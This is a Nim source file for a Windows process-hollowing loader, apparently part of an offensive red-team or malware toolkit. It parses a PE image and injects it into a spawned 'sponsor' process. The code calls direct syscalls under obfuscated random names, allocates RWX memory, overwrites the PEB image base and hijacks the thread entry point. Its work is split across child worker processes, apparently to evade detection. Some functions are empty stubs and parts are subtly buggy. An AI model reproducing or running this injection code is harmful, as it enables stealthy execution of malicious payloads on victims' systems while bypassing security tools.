import os
import winim
import strutils
import ptr_math

include syscalls

# Manager
# Allocate          -> -A:<sponsor-process-handle>
# Write             -> -W:<sponsor-process-handle>
# Thread context    -> -T:<sponsor-thread-handle>
# Resume            -> -R:<sponsor-thread-handle>


proc createProcessWorker*(arg: string): PPROCESS_INFORMATION =

    var processCmd = getAppFilename() & " " & arg
    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    if CreateProcessA(
        NULL,
        cast[LPSTR](addr processCmd[0]),
        NULL,
        NULL, 
        TRUE,
        0, # CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si,
        addr pi
    ) != TRUE:
        echo $GetLastError()
        quit()

    return addr pi


proc allocateMemoryProcess(processHandle: Handle, peImageImageBase: ptr PVOID, peImageSize: ptr size_t) =
    if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
        processHandle,
        peImageImageBase,
        0,
        peImageSize,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    ) != 0:
        quit(1)
    else:
        quit(0)


proc writeMemoryProcess(processHandle: Handle) =
    discard

proc setThreadProcess(threadHandle: Handle) =
    discard

proc resumeThreadProcess(threadHandle: Handle) =
    discard

proc nimlineSplitted*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
    
    # vars to check childen processes
    var res: DWORD
    var ppi: PPROCESS_INFORMATION

    # Parse PE
    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
    var peBytesPtr = addr peBytes[0]
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
    var peImageSizeOfHeaders = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfHeaders)
    var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
    var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
    var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
  
    # Extract process information
    let sponsorProcessHandle = processInfoAddress.hProcess
    let sponsorThreadHandle = processInfoAddress.hThread
    let sponsorPid = processInfoAddress.dwProcessId
    let sponsorTid = processInfoAddress.dwThreadId
    when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
    when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
    
    # Get remote PEB address
    when not defined(release): echo "[*] Retrieving PEB address" 
    var bi: PROCESS_BASIC_INFORMATION
    var ret: DWORD
    if NtQueryInformationProcess(
        sponsorProcessHandle,
        0,
        addr bi,
        cast[windef.ULONG](sizeof(bi)),
        addr ret
    ) != 0:
        when not defined(release): echo "[-] Could not query sponsor process"   
        quit()
    
    let sponsorPeb = bi.PebBaseAddress
    when not defined(release): echo "[i] Sponsor PEB address: 0x" & $cast[int](sponsorPeb).toHex

    # Parse command line arg
    for i in commandLineParams():
        if i.startsWith("-A:"):
            allocateMemoryProcess(parseInt(i.replace("-A:", "")), addr peImageImageBase, addr peImageSize)
        elif i.startsWith("-W:"):
            writeMemoryProcess(parseInt(i.replace("-W:", "")))
        elif i.startsWith("-T:"):
            setThreadProcess(parseInt(i.replace("-T:", "")))
        elif i.startsWith("-R:"):
            resumeThreadProcess(parseInt(i.replace("-R:", "")))
        else:
            continue

    # Allocate memory in sponsor process
    when not defined(release): echo "[*] Allocating memory in sponsor process"     
    ppi = createProcessWorker("-A:" & $sponsorProcessHandle)
    WaitForSingleObject(ppi.hProcess, 3 * 1000)
    discard GetExitCodeProcess(ppi.hProcess, addr res)
    if res != 0:
        when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
        quit()

    when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](peImageImageBase).toHex 
    when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](peImageImageBase) + cast[int](peImageEntryPoint)).toHex 

    # Copy PE headers to sponsor process 
    when not defined(release): echo "[*] Copying PE headers to sponsor process"    
    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
        sponsorProcessHandle,
        peImageImageBase,
        peBytesPtr,
        peImageSizeOfHeaders,
        NULL
    ) != 0:
        when not defined(release): echo "[-] Could not write to sponsor process"
        quit() 

    # Copy PE sections to sponsor process
    when not defined(release): echo "[*] Copying PE sections to sponsor process"    
    for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
            sponsorProcessHandle,
            peImageImageBase + peImageSectionsHeader[i].VirtualAddress,
            peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
            peImageSectionsHeader[i].SizeOfRawData,
            NULL
        ) != 0:
            when not defined(release): echo "[-] Could not write headers to sponsor process"
            quit()
    
    # Overwrite sponsor PEB with the new image base address 
    when not defined(release): echo "[*] Overwriting PEB with the new image base address"
    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
        sponsorProcessHandle,
        cast[LPVOID](cast[int](sponsorPeb) + 0x10),
        addr peImageImageBase,
        8,
        NULL
    ) != 0:
        when not defined(release): echo "[-] Could not write sections to sponsor process"
        quit()

    # Change sponsor thread Entrypoint
    var context: CONTEXT
    context.ContextFlags = CONTEXT_INTEGER
    if VzpSdkMDEGHOzTpB( # NtGetContextThread
        sponsorThreadHandle, 
        addr context
    ) != 0:
        when not defined(release): echo "[-] Could not read from sponsor process PEB"
        quit()
    var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
    when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
    context.Rcx = cast[DWORD64](entryPoint)
    if IGyhziwCULdezDSq( # NtSetContextThread
        sponsorThreadHandle, addr context
    ) != 0:
        when not defined(release): echo "[-] Could not write to from sponsor process PEB"
        quit()
    
    # Resume remote thread 
    when not defined(release): echo "[*] Resuming remote thread"
    if mAcJDfMgbUNFgsxu( # NtResumeThread
        sponsorThreadHandle,
        NULL
    ) != 0:
        when not defined(release): echo "[-] Could resume the thread"
        quit()

